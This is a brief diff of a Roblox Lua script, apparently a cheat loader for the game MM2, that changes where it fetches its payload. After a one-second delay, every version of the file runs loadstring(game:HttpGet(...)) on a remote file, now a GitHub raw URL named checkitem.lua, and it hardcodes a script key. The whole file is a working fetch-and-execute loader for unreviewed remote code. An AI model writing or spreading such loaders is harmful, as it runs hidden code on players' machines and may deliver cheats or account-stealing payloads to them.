@@ -1,7 +1,7 @@
 getgenv().daubuoi = true
 
 task.delay(1, function()
-loadstring(game:HttpGet("https://raw.sellaccroblox.com/raw/raws/MM2/checkitems222.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/chuicuto123/hibe/refs/heads/main/checkitem.lua"))()
 end)
 
 script_key = "dfOqNvpsIboexIqvRfGBhlinaFOKEbVx"
